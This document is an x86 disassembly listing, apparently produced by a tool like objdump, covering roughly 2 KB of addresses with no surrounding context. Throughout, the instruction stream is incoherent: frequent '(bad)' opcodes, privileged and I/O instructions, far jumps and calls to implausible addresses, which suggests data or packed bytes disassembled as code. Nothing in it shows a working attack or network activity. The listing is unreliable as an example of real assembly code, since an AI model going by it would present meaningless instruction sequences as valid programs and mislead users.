  4277bd:	add    eax,DWORD PTR [ebx]
  4277bf:	loopne 0x4277d0
  4277c1:	dec    ebp
  4277c2:	ror    DWORD PTR [edx+0x7233084d],0x3
  4277c9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4277cf:	lock cwde 
  4277d1:	ret    
  4277d2:	xor    al,BYTE PTR [ebp-0x77]
  4277d5:	mov    esi,esp
  4277d7:	rol    BYTE PTR [ebp-0x7c],1
  4277da:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  4277e0:	call   edi
  4277e2:	enter  0x4d45,0x8b
  4277e6:	mov    esi,eax
  4277e8:	fmul   st(3),st
  4277ea:	push   ebp
  4277eb:	dec    ebp
  4277ec:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4277f2:	ret    0xc198
  4277f5:	xor    al,BYTE PTR [esi-0x280276]
  4277fb:	dec    ebp
  4277fc:	jne    0x427831
  4277fe:	mov    eax,DWORD PTR [ebx]
  427800:	cld    
  427801:	loopne 0x4277b3
  427803:	push   ebp
  427804:	add    DWORD PTR [eax+0x72851100],ecx
  42780a:	inc    DWORD PTR [eax]
  42780c:	inc    DWORD PTR [ebp-0x75]
  42780f:	mov    edi,esp
  427811:	lock add bl,0x1
  427815:	retf   
  427816:	add    dh,al
  427818:	xor    dh,cl
  42781a:	inc    ebp
  42781b:	scas   eax,DWORD PTR es:[edi]
  42781c:	mov    eax,DWORD PTR [ebx]
  42781e:	shl    al,0x0
  427821:	inc    ebp
  427822:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427828:	call   0x458a60
  42782d:	ud0    eax,ecx
  427830:	adc    al,0x4d
  427832:	inc    ebp
  427833:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427839:	lock push 0x338055
  42783f:	add    eax,DWORD PTR [eax]
  427841:	ud0    ecx,edx
  427844:	sbb    BYTE PTR [ebp+0x5e],dl
  427847:	xor    ecx,ecx
  427849:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427850:	push   ecx
  427851:	add    BYTE PTR [ebp-0x38],cl
  427854:	mov    DWORD PTR [esi-0x740004],eax
  42785a:	cld    
  42785b:	inc    ebp
  42785c:	xchg   edx,eax
  42785d:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427863:	xabort 0xaf
  427866:	icebp  
  427867:	mov    esi,DWORD PTR [ebp-0x28]
  42786a:	(bad)  
  42786b:	retf   
  42786c:	or     ecx,eax
  42786e:	(bad)  
  42786f:	dec    ebp
  427870:	pop    es
  427871:	(bad)  
  427872:	(bad)  
  427873:	or     BYTE PTR [esi],al
  427875:	jb     0x42783d
  427877:	add    BYTE PTR [ebx],al
  427879:	inc    ebp
  42787a:	(bad)  
  42787b:	mov    ecx,DWORD PTR [edx]
  42787d:	fadd   st(6),st
  42787f:	ret    
  427880:	add    ch,BYTE PTR [eax-0x37]
  427883:	int    0x55
  427885:	sub    ebp,esp
  427887:	add    edx,DWORD PTR [ecx-0x14]
  42788a:	inc    ebp
  42788b:	inc    ebp
  42788c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427892:	cld    
  427893:	(bad)  
  427894:	mov    gs,WORD PTR [edi+0xf893be0]
  42789a:	mov    ebp,ebp
  42789c:	clc    
  42789d:	push   eax
  42789f:	push   DWORD PTR [ebp-0x4]
  4278a2:	mov    BYTE PTR [ebp+0xa],0xff
  4278a6:	(bad)  
  4278a7:	int3   
  4278a8:	or     BYTE PTR [eax],al
  4278aa:	(bad)  
  4278ab:	lea    eax,[edi]
  4278ad:	ins    BYTE PTR es:[edi],dx
  4278ae:	(bad)  
  4278af:	inc    DWORD PTR [ecx]
  4278b1:	push   eax
  4278b2:	mov    BYTE PTR [ebp+0x9],0x8b
  4278b6:	leave  
  4278b7:	les    edx,FWORD PTR [ebp+0x0]
  4278ba:	in     al,dx
  4278bb:	call   DWORD PTR [ecx-0x75]
  4278be:	inc    ebp
  4278bf:	cld    
  4278c0:	mov    DWORD PTR [eax+0x8b01fc],eax
  4278c6:	cld    
  4278c7:	xor    BYTE PTR [edi-0x76a8f98b],bh
  4278cd:	std    
  4278ce:	mov    eax,DWORD PTR [eax]
  4278d0:	clc    
  4278d1:	test   eax,esi
  4278d3:	je     0x42794a
  4278d5:	mov    eax,esi
  4278d7:	cld    
  4278d8:	add    al,0x80
  4278da:	add    WORD PTR [ecx+0x0],ax
  4278de:	fadd   QWORD PTR [eax]
  4278e0:	mov    BYTE PTR [eax],0xd0
  4278e3:	push   0xffffffc3
  4278e5:	push   edi
  4278e6:	mov    edx,DWORD PTR [eax+0x51]
  4278e9:	pop    edi
  4278ea:	lea    ebx,[ebx-0x8]
  4278ed:	ret    0x45
  4278f0:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  4278f6:	xchg   eax,edi
  4278f8:	mov    DWORD PTR [ebp-0x75],ecx
  4278fb:	push   esi
  4278fc:	clc    
  4278fd:	jne    0x4278cf
  4278ff:	mov    ecx,0xf8450b0b
  427904:	(bad)  
  427905:	push   cs
  427906:	or     BYTE PTR [ebp-0x3a],dh
  427909:	cmp    eax,DWORD PTR [ecx]
  42790b:	pop    esi
  42790c:	(bad)  
  42790d:	or     al,0x5
  42790f:	inc    eax
  427910:	leave  
  427911:	in     al,dx
  427912:	add    al,0x42
  427914:	push   esi
  427915:	and    eax,0xedc940cf
  42791a:	inc    DWORD PTR [eax-0x75]
  42791d:	fmul   QWORD PTR [ebx-0xf8739be]
  427923:	inc    eax
  427924:	nop
  427925:	jmp    0x518b:0x8b8bc3ff
  42792c:	(bad)  
  42792d:	lea    eax,ds:0xff45e8f8
  427933:	push   esi
  427934:	push   DWORD PTR [ebp-0x39]
  427937:	mov    eax,0x7edda46
  42793c:	or     al,0x6
  42793e:	push   DWORD PTR [ebp-0x3a]
  427941:	cmp    eax,DWORD PTR [edx]
  427943:	pop    esi
  427944:	ret    
  427945:	or     al,0x56
  427947:	inc    ecx
  427948:	push   ebp
  427949:	js     0x427937
  42794b:	inc    edx
  42794c:	inc    ebp
  42794d:	int    0x1
  42794f:	inc    ecx
  427950:	sub    BYTE PTR ds:0xe77541fc,ah
  427956:	add    DWORD PTR [edx+0x1c],eax
  427959:	int3   
  42795a:	mov    eax,ebx
  42795c:	adc    al,0x8b
  42795e:	xchg   edx,eax
  42795f:	push   ecx
  427960:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427966:	rcl    DWORD PTR [esi-0x9],cl
  427969:	jne    0x4279bb
  42796b:	mov    eax,0x7c80ece
  427970:	rol    DWORD PTR [esi],cl
  427972:	div    DWORD PTR [ebp+0x50]
  427975:	cmp    ecx,edx
  427977:	pop    esi
  427978:	dec    BYTE PTR [edx]
  42797a:	in     al,dx
  42797b:	inc    edx
  42797c:	sub    ebp,ecx
  42797e:	inc    eax
  42797f:	(bad)  
  427980:	push   eax
  427981:	add    edx,DWORD PTR [eax-0x17]
  427984:	push   edi
  427985:	add    dh,dh
  427987:	leave  
  427988:	adc    DWORD PTR [ebp-0x1],0xffffffec
  42798c:	add    BYTE PTR [ecx+0x0],dl
  42798f:	inc    ebp
  427990:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427996:	add    BYTE PTR [eax-0x7fbf448],bh
  42799c:	add    al,0x2
  42799e:	jmp    0x57e24f8
  4279a3:	jne    0x42798d
  4279a5:	mov    eax,DWORD PTR [edx]
  4279a7:	or     BYTE PTR [eax],al
  4279a9:	inc    ecx
  4279aa:	stc    
  4279ab:	in     eax,dx
  4279ac:	ss inc eax
  4279ae:	aas    
  4279af:	out    0x7d,eax
  4279b1:	inc    ecx
  4279b2:	mov    esi,ecx
  4279b4:	lock ret 0x7d
  4279b8:	and    ecx,DWORD PTR [ebx-0x171777]
  4279be:	add    bh,bh
  4279c0:	aad    0xd7
  4279c2:	add    dh,cl
  4279c4:	clts   
  4279c6:	(bad)  
  4279c7:	call   0xffcd78cc
  4279cc:	hlt    
  4279cd:	iret   
  4279ce:	jge    0x4279a6
  4279d0:	rol    DWORD PTR [esi-0x80],cl
  4279d3:	icebp  
  4279d4:	or     BYTE PTR [edi-0x27],cl
  4279d7:	(bad)  
  4279d8:	out    dx,al
  4279d9:	mov    eax,DWORD PTR [ebx]
  4279db:	(bad)  
  4279dc:	pop    esi
  4279dd:	push   es
  4279de:	cmp    al,0xe8
  4279e0:	sar    edi,0x8
  4279e3:	inc    DWORD PTR [edi]
  4279e5:	inc    esi
  4279e6:	(bad)  
  4279e7:	jmp    0x8b00:0x530e577e
  4279ee:	push   esi
  4279ef:	mov    eax,DWORD PTR [eax]
  4279f1:	and    al,0x0
  4279f3:	inc    ebp
  4279f4:	push   eax
  4279f5:	push   eax
  4279f6:	add    DWORD PTR [ebx+0x757d1834],ecx
  4279fc:	sub    edx,DWORD PTR [esi-0x24]
  4279ff:	jne    0x4279b7
  427a01:	lods   eax,DWORD PTR ds:[esi]
  427a02:	mov    edx,DWORD PTR [edx-0x34]
  427a05:	dec    esi
  427a06:	out    0x83,eax
  427a08:	into   
  427a09:	push   edi
  427a0b:	loopne 0x4279db
  427a0d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427a11:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427a18:	rol    DWORD PTR [edx],0x8
  427a1b:	mov    esp,ecx
  427a1d:	cmp    DWORD PTR [ebx],0xc
  427a20:	mov    esi,0x5001c0
  427a25:	push   eax
  427a26:	push   cs
  427a27:	push   eax
  427a28:	(bad)  
  427a29:	sub    edx,edi
  427a2b:	push   esi
  427a2c:	adc    al,0xcb
  427a2e:	ins    DWORD PTR es:[edi],dx
  427a2f:	mov    eax,0x203e8
  427a34:	add    al,ah
  427a36:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427a3d:	add    dh,al
  427a3f:	add    ah,ch
  427a41:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427a47:	pop    ecx
  427a48:	or     eax,ebx
  427a4a:	cli    
  427a4b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427a51:	lea    ebp,[ebx]
  427a53:	mov    edx,DWORD PTR [edx-0x4]
  427a56:	dec    ecx
  427a57:	inc    ebp
  427a58:	shr    BYTE PTR [ebx],0x4b
  427a5b:	and    al,0x0
  427a5d:	(bad)  
  427a5e:	jne    0x427aa5
  427a60:	pop    eax
  427a61:	mov    al,0x5a
  427a63:	call   0x1417cc2
  427a68:	and    al,0x85
  427a6a:	push   edx
  427a6b:	add    BYTE PTR [eax+eax*1+0x0],ah
  427a6f:	dec    ebp
  427a70:	mov    cl,0x23
  427a72:	jmp    0x427a60
  427a74:	mov    al,0xe7
  427a76:	call   0x1387d64
  427a7b:	shr    DWORD PTR [eax+ebx*2],cl
  427a7e:	lock (bad) 
  427a80:	adc    eax,0x757f008d
  427a85:	out    0x58,eax
  427a87:	cmp    al,0x7
  427a89:	pop    edx
  427a8a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427a91:	push   ecx
  427a92:	cld    
  427a93:	mov    esi,0x3b0175
  427a98:	and    al,0xb0
  427a9a:	xor    BYTE PTR [edx+0x1],0x8b
  427a9e:	add    ah,bh
  427aa0:	mov    edi,DWORD PTR [ebp-0x4]
  427aa3:	psubsw mm7,QWORD PTR [edi]
  427aa6:	add    DWORD PTR [ebp+0x0],ebp
  427aa9:	rcr    eax,1
  427aab:	mov    edi,ecx
  427aad:	and    eax,DWORD PTR [eax]
  427aaf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427ab5:	call   0x12f7d9e
  427aba:	add    al,cl
  427abc:	mov    ebp,esi
  427abe:	aam    0x83
  427ac0:	or     DWORD PTR [ecx],eax
  427ac2:	jne    0x427ab5
  427ac4:	mov    eax,DWORD PTR [eax]
  427ac6:	aam    0x0
  427ac8:	dec    ebp
  427ac9:	jne    0x427a56
  427acb:	cmp    ebx,eax
  427acd:	jb     0x427b1c
  427acf:	jmp    0x427a5c
  427ad1:	mov    ebx,esp
  427ad3:	int3   
  427ad4:	dec    ebp
  427ad5:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427adc:	mov    edx,0x8b0a8b
  427ae1:	cmp    ecx,DWORD PTR [eax]
  427ae3:	jb     0x427abc
  427ae5:	pop    edx
  427ae6:	push   edi
  427ae7:	cli    
  427ae8:	pop    es
  427ae9:	mov    eax,ecx
  427aeb:	jb     0x427aef
  427aed:	add    DWORD PTR [ebx],0xa
  427af0:	mov    eax,DWORD PTR [ebx]
  427af2:	int3   
  427af3:	add    bh,BYTE PTR [esi+0x75d10006]
  427af9:	jmp    0x427a86
  427afb:	mov    al,0xe8
  427afd:	call   0x1037d7f
  427b02:	add    edx,DWORD PTR [ecx+ecx*8]
  427b05:	pop    edi
  427b06:	or     BYTE PTR [ecx-0x73],bl
  427b09:	pop    ecx
  427b0a:	inc    edi
  427b0b:	xor    al,0xeb
  427b0d:	push   ecx
  427b0e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427b14:	call   0xb17c19
  427b19:	int3   
  427b1a:	sbb    BYTE PTR [esi],ch
  427b1c:	inc    ebp
  427b1d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427b23:	call   0x9b7d92
  427b28:	or     BYTE PTR [ebx-0x73],dl
  427b2b:	cmp    al,0x47
  427b2d:	mov    al,0x1
  427b2f:	jb     0x427b31
  427b31:	mov    al,0x10
  427b33:	push   eax
  427b34:	add    al,0x75
  427b36:	add    BYTE PTR [ebx],ch
  427b38:	add    ebx,esp
  427b3a:	int3   
  427b3b:	jne    0x427b4d
  427b3d:	movsx  edx,cl
  427b40:	add    DWORD PTR [eax],eax
  427b42:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427b49:	mov    gs,edi
  427b4b:	add    BYTE PTR [eax-0x50],ch
  427b4e:	add    al,ch
  427b50:	mov    eax,DWORD PTR [ecx]
  427b52:	sub    eax,DWORD PTR [eax]
  427b54:	jb     0x427bcb
  427b56:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427b5a:	jge    0x427b44
  427b5c:	add    al,0x1
  427b5e:	add    DWORD PTR [eax],0x0
  427b61:	jne    0x427b63
  427b63:	je     0x427baa
  427b65:	mov    eax,DWORD PTR [edi]
  427b67:	ror    BYTE PTR [ebp+0x4d],1
  427b6a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427b71:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427b77:	mov    DWORD PTR [ebx],ebp
  427b79:	fadd   DWORD PTR [eax+0x75]
  427b7c:	inc    eax
  427b7d:	pop    eax
  427b7e:	lea    ebx,[ecx+0x4f]
  427b81:	push   0xb1000003
  427b86:	out    dx,eax
  427b87:	add    ebp,DWORD PTR [edx+edx*2]
  427b8a:	add    BYTE PTR [ebx+ecx*4],bh
  427b8d:	mov    ch,BYTE PTR [ebx]
  427b8f:	jb     0x427c03
  427b91:	add    al,0x89
  427b93:	push   eax
  427b94:	call   0x842ac906
  427b99:	add    DWORD PTR [eax+eax*1],eax
  427b9c:	jae    0x427bb2
  427b9e:	icebp  
  427b9f:	inc    ebp
  427ba0:	mov    eax,DWORD PTR gs:[ecx]
  427ba3:	int3   
  427ba4:	out    dx,al
  427ba5:	loopne 0x427bf4
  427ba7:	sub    eax,DWORD PTR [edx]
  427ba9:	push   0xffffff83
  427bab:	pop    esi
  427bac:	push   cs
  427bad:	jl     0x427bc8
  427baf:	add    al,0xaf
  427bb1:	xor    eax,0x832b6d00
  427bb6:	mov    eax,DWORD PTR [edx]
  427bb8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  427bbe:	ror    DWORD PTR [ebx+0x7dc8e803],1
  427bc4:	inc    ebp
  427bc5:	shr    ebx,0x3
  427bc8:	or     DWORD PTR [eax],0x4
  427bcb:	push   0xffffffa5
  427bcd:	pop    esi
  427bce:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  427bd5:	jmp    0x427c34
  427bd7:	mov    edi,0xff0272
  427bdc:	fdivr  QWORD PTR [ebp+0x5d]
  427bdf:	push   0x4e
  427be1:	pop    ecx
  427be2:	call   0x42bfe7
  427be7:	mov    DWORD PTR [ebx],eax
  427be9:	in     al,0xc8
  427beb:	rol    BYTE PTR [ebp-0x75],0xc1
  427bef:	call   0xac7dd0
  427bf4:	pop    esi
  427bf5:	enter  0xceff,0x8b
  427bf9:	repz mov ecx,DWORD PTR [ebp-0x34]
  427bfd:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  427c04:	je     0x427c06
  427c06:	or     DWORD PTR [ebx-0x74183b24],eax
  427c0c:	jne    0x427bf2
  427c0e:	jmp    0x427c09
  427c10:	push   DWORD PTR [edx-0x24]
  427c13:	push   0x4d
  427c15:	pop    ecx
  427c16:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  427c1a:	jge    0x427c22
  427c1c:	mov    eax,eax
  427c1e:	sub    ebp,DWORD PTR [edx+0x24]
  427c21:	pop    esi
  427c22:	inc    ebp
  427c23:	mov    esp,0x8b6077
  427c28:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  427c2e:	lods   al,BYTE PTR ds:[esi]
  427c2f:	add    BYTE PTR [ebx],bh
  427c31:	enter  0xce73,0x49
  427c35:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  427c3d:	stc    
  427c3e:	jge    0x427cb2
  427c40:	jnp    0xdd41ffaf
  427c46:	call   0xc57d1c
  427c4b:	fadd   st(0),st
  427c4d:	dec    esi
  427c4e:	ins    BYTE PTR es:[edi],dx
  427c4f:	stc    
  427c50:	cmp    al,0x73
  427c52:	push   ebp
  427c53:	mov    eax,0xf8028b
  427c58:	jne    0x427c1b
  427c5a:	mov    esi,ecx
  427c5c:	mov    esp,DWORD PTR [ebp+0x2c]
  427c5f:	add    edi,DWORD PTR [ebp-0x24]
  427c62:	sub    esp,eax
  427c64:	and    al,0x45
  427c66:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  427c6c:	sbb    al,0xee
  427c6e:	pop    esi
  427c6f:	call   0x827c9f
  427c74:	fsubr  st,st(3)
  427c76:	sti    
  427c77:	add    BYTE PTR gs:[ecx],bh
  427c7a:	add    eax,esp
  427c7c:	add    DWORD PTR [esi],eax
  427c7e:	rol    DWORD PTR [ebp+0x8],0x29
  427c82:	mov    esp,eax
  427c84:	clc    
  427c85:	jne    0x427cfc
  427c87:	mov    eax,0x8b0673
  427c8c:	loopne 0x427cd3
  427c8e:	loopne 0x427c19
  427c90:	lods   al,BYTE PTR ds:[esi]
  427c91:	int3   
  427c92:	inc    ebp
  427c93:	mov    DWORD PTR gs:[eax+edi*8],eax
  427c97:	add    al,0xc3
  427c99:	sub    ecx,DWORD PTR [ebp+0x47]
  427c9c:	(bad)  
  427c9e:	shr    BYTE PTR [ebp-0x1f],0xe8
  427ca2:	add    eax,DWORD PTR [eax]
  427ca4:	call   0x6443da9
  427ca9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  427caf:	dec    esi
  427cb0:	ins    DWORD PTR es:[edi],dx
  427cb1:	in     al,dx
  427cb2:	lea    eax,[eax]
  427cb4:	inc    ebp
  427cb5:	inc    ebp
  427cb6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  427cbc:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  427cc6:	and    al,0xdc
  427cc8:	ror    DWORD PTR [edx+0x24],0xf7
  427ccc:	or     BYTE PTR [ebp+0x4c],dh
  427ccf:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  427cd3:	stos   BYTE PTR es:[edi],al
  427cd4:	adc    edx,edi
  427cd6:	inc    esp
  427cd7:	add    edi,DWORD PTR [eax]
  427cd9:	jne    0x427cbe
  427cdb:	mov    DWORD PTR [eax-0x7449db04],ecx
  427ce1:	cmp    ecx,DWORD PTR [edi]
  427ce3:	sub    BYTE PTR [ebp-0x7e],dl
  427ce6:	sar    ebp,0xb
  427ce9:	jmp    FWORD PTR [edi+0x2400392a]
  427cef:	sub    esi,DWORD PTR [ebx-0x73]
  427cf2:	mov    esp,DWORD PTR [ecx+edi*4]
  427cf5:	mov    ecx,DWORD PTR [eax]
  427cf7:	and    BYTE PTR [eax],al
  427cf9:	jne    0x427cc5
  427cfb:	sub    ebp,ecx
  427cfd:	sbb    BYTE PTR [esi+0x32],ah
  427d00:	dec    ebp
  427d01:	push   ebp
  427d02:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  427d08:	ret    
  427d09:	mov    edx,ebp
  427d0b:	leave  
  427d0c:	sub    DWORD PTR [esi+0x24],ebx
  427d0f:	ret    0x2b
  427d12:	pop    ax
  427d14:	push   ebp
  427d15:	rol    BYTE PTR [ebx],0xeb
  427d18:	add    DWORD PTR [ecx+0x6c0001],0x40
  427d1f:	jb     0x427d76
  427d21:	ret    
  427d22:	in     al,dx
  427d23:	jecxz  0x427cb0
  427d25:	push   esi
  427d26:	xchg   esp,eax
  427d27:	jne    0x427d29
  427d29:	cmp    edx,DWORD PTR [esi+0x1c]
  427d2c:	jne    0x427d12
  427d2e:	mov    eax,DWORD PTR [ebp-0x77]
  427d31:	ror    DWORD PTR [ebx+0x899408],0xe0
  427d38:	mov    esi,DWORD PTR [ebp-0x75]
  427d3b:	pop    esi
  427d3c:	nop
  427d3d:	mov    eax,DWORD PTR [eax]
  427d3f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  427d45:	add    al,0x0
  427d47:	inc    ebp
  427d48:	mov    eax,DWORD PTR [ebx]
  427d4a:	mov    ebp,ebx
  427d4c:	cmp    al,0xf
  427d4e:	or     al,al
  427d50:	inc    ebp
  427d51:	inc    ebp
  427d52:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  427d58:	cld    
  427d59:	add    BYTE PTR [edi+0x506c16c0],dh
  427d5f:	add    BYTE PTR [ecx-0x5],dl
  427d62:	add    eax,0x17200
  427d67:	sbb    al,0x85
  427d69:	dec    esp
  427d6a:	je     0x427da4
  427d6c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  427d70:	add    BYTE PTR [ebx],bh
  427d72:	(bad)  
  427d73:	and    al,0x39
  427d75:	jae    0x427d13
  427d77:	mov    cl,cl
  427d79:	inc    DWORD PTR [esp]
  427d7c:	push   ebp
  427d7d:	shr    esp,0x8
  427d80:	in     al,dx
  427d81:	push   esp
  427d82:	add    DWORD PTR [eax],esp
  427d84:	add    bl,cl
  427d86:	inc    ebp
  427d87:	mov    bh,0x89
  427d89:	add    ah,bh
  427d8b:	jmp    0xca7b8cd5
  427d90:	pushf  
  427d91:	dec    esp
  427d92:	mov    edx,0xf8178520
  427d97:	fst    DWORD PTR [ebp+0x0]
  427d9a:	mov    BYTE PTR [eax],0xc4
  427d9d:	sub    edx,DWORD PTR [ebx-0x3f]
  427da0:	inc    ebp
  427da1:	add    eax,0xc601dc
  427da6:	mov    al,0xc6
  427da9:	ins    BYTE PTR es:[edi],dx
  427daa:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  427db1:	dec    esp
  427db2:	jmp    DWORD PTR [eax]
  427db4:	inc    ebp
  427db5:	fnstcw WORD PTR [eax+0x29]
  427db8:	test   BYTE PTR [eax],0xc5
  427dbb:	rol    BYTE PTR [eax],0xc0
  427dbe:	lea    ecx,[ebp-0x3cf0dbcb]
  427dc4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  427dca:	inc    esi
  427dcb:	add    DWORD PTR [eax],ebx
  427dcd:	add    dh,bh
  427dcf:	mov    esi,DWORD PTR [edx+0x8]
  427dd2:	(bad)  
  427dd3:	fdiv   QWORD PTR ss:[ecx]
  427dd6:	(bad)  
  427dd7:	mov    bl,ch
  427dd9:	add    esi,eax
  427ddb:	add    dh,bl
  427ddd:	or     esi,eax
  427ddf:	mov    dl,0xdf
  427de1:	add    esi,eax
  427de3:	add    al,ah
  427de5:	push   cs
  427de6:	mov    BYTE PTR [edx+0xc601e1],0xe2
  427ded:	or     BYTE PTR [ebx],dh
  427def:	dec    ecx
  427df0:	lea    eax,[ebx]
  427df2:	xor    eax,0x18fc0fc7
  427df7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427df8:	repz clc 
  427dfa:	add    eax,DWORD PTR [ebp+0x46]
  427dfd:	prefetcht0 BYTE PTR [ecx-0x2]
  427e01:	xor    eax,0x7c60872
  427e06:	mov    esp,0xbd32c698
  427e0b:	pop    esi
  427e0c:	mov    cl,0xbe
  427e0f:	or     al,0xc6
  427e11:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  427e18:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  427e1f:	add    dh,al
  427e21:	mov    eax,ebx
  427e23:	xor    DWORD PTR [ebx],0x35008dbc
  427e29:	mov    ecx,DWORD PTR [edi]
  427e2b:	sbb    al,0x18
  427e2d:	inc    ebp
  427e2e:	xrelease mov DWORD PTR [ebx],0x188546f4
  427e35:	clc    
  427e36:	(bad)  
  427e37:	cmp    BYTE PTR [edx-0x64],dh
  427e3a:	lea    ecx,[ecx+0x45ffe838]
  427e40:	mov    ecx,esp
  427e42:	fadd   st,st(6)
  427e44:	dec    ebp
  427e45:	lds    edi,FWORD PTR [eax+0x7145fc56]
  427e4b:	out    0x1,eax
  427e4d:	inc    ebp
  427e4e:	lea    ebp,ds:0xc8ffc6ff
  427e54:	enter  0xa33,0xc6
  427e58:	push   ebp
  427e59:	leave  
  427e5a:	(bad)  
  427e5b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  427e61:	add    BYTE PTR [ebp+0x44],al
  427e64:	mov    eax,esp
  427e66:	mov    WORD PTR [esi+0x43398300],?
  427e6c:	psubusw mm4,QWORD PTR [eax-0x78]
  427e70:	add    BYTE PTR [ebx-0x1303f975],al
  427e76:	add    BYTE PTR [ebp+0x1],0xf3
  427e7a:	add    BYTE PTR [ebp+0x38],al
  427e7d:	in     eax,dx
  427e7e:	inc    ebp
  427e7f:	inc    ebp
  427e80:	mov    esp,ebx
  427e82:	add    BYTE PTR [ebp+0x0],0xee
  427e86:	mov    DWORD PTR [ebp-0x48],eax
  427e89:	sub    eax,0x2e00454f
  427e8e:	js     0x427ed5
  427e90:	data16 js 0x427e18
  427e93:	idiv   bh
  427e95:	inc    esp
  427e96:	(bad)  
  427e97:	fadd   st(7),st
  427e99:	mov    dh,0x89
  427e9b:	and    DWORD PTR [esi+0x43],0xffffffff
  427e9f:	fld    DWORD PTR [ebx-0x767cc078]
  427ea5:	pop    es
  427ea6:	push   0x8d45ffec
  427eab:	in     eax,dx
  427eac:	inc    DWORD PTR [ebp-0x77]
  427eaf:	loopne 0x427f1b
  427eb1:	inc    ebp
  427eb2:	jmp    esp
  427eb4:	add    DWORD PTR [ebp+0x11],0xfffffff1
  427eb8:	mov    DWORD PTR [ebp+0x6c],eax
  427ebb:	(bad)  
  427ebd:	inc    ebp
  427ebe:	(bad)  
  427ebf:	call   0xe7cbc3d0
  427ec4:	outs   dx,BYTE PTR ds:[esi]
  427ec5:	inc    ebp
  427ec6:	(bad)  
  427ec7:	js     0x427e4c
  427ec9:	div    BYTE PTR ds:0x70bc8944
  427ecf:	mov    dh,0xff
  427ed1:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  427ed8:	jb     0x427e5d
  427eda:	dec    DWORD PTR [eax]
  427edc:	mov    ebp,esp
  427ede:	test   WORD PTR [ebp-0x1],ax
  427ee5:	inc    ebp
  427ee6:	ror    BYTE PTR [ebx-0x117a279a],0xff
  427eed:	adc    edi,edi
  427eef:	mov    ecx,esi
  427ef1:	mov    eax,DWORD PTR [eax]
  427ef3:	cmp    BYTE PTR [esi-0x1],ah
  427ef6:	test   DWORD PTR [ebx],edi
  427ef8:	push   DWORD PTR [ebp-0x1]
  427efb:	mov    DWORD PTR [esi-0x48],ebp
  427efe:	add    BYTE PTR [ebp+0x66],al
  427f01:	jmp    0x427e88
  427f03:	pushf  
  427f04:	dec    DWORD PTR [ebx-0x7f9c0301]
  427f0a:	add    BYTE PTR [ecx],al
  427f0c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  427f13:	add    al,al
  427f15:	add    BYTE PTR [esi+0x45],ah
  427f18:	test   DWORD PTR [ebx+0xff7cff],ecx
  427f1e:	dec    esp
  427f1f:	mov    DWORD PTR [eax],eax
  427f21:	mov    esp,DWORD PTR [esi-0x4]
  427f24:	inc    ebp
  427f25:	cmp    BYTE PTR [eax+0x4701],0x38
  427f2c:	mov    DWORD PTR [ecx-0x7e],esp
  427f2f:	add    BYTE PTR [edi-0x73],al
  427f32:	push   0xffffffd1
  427f34:	mov    WORD PTR [ebp+0x64],ax
  427f38:	(bad)  
  427f39:	call   eax
  427f3b:	mov    esp,eax
  427f3d:	data16 icebp 
  427f3f:	test   DWORD PTR [ebp-0x1],eax
  427f42:	(bad)  
  427f44:	out    0xc0,eax
  427f46:	lea    esp,[esi-0x30]
  427f49:	test   DWORD PTR [edx+0x43ff80ff],ecx
  427f4f:	inc    edi
  427f50:	jmp    0x75ff:0x40858866
  427f57:	dec    DWORD PTR [ebp-0x7a992f40]
  427f5d:	test   esi,edi
  427f5f:	(bad)  
  427f60:	(bad)  
  427f61:	inc    DWORD PTR [ebp-0x9901b9]
  427f67:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  427f6d:	rcl    BYTE PTR [ecx+0x66],0x33
  427f71:	test   DWORD PTR [ebx+0xff72ff],edi
  427f77:	inc    edi
  427f78:	ret    
  427f79:	mov    ax,WORD PTR [ebp-0x3f0004]
  427f80:	push   eax
  427f81:	mov    DWORD PTR [ebp-0x77],0xff98748b
  427f88:	add    BYTE PTR [ebx-0x764ff439],al
  427f8e:	push   DWORD PTR [esi+0x1]
  427f91:	inc    DWORD PTR [eax]
  427f93:	mov    eax,0xff99ff
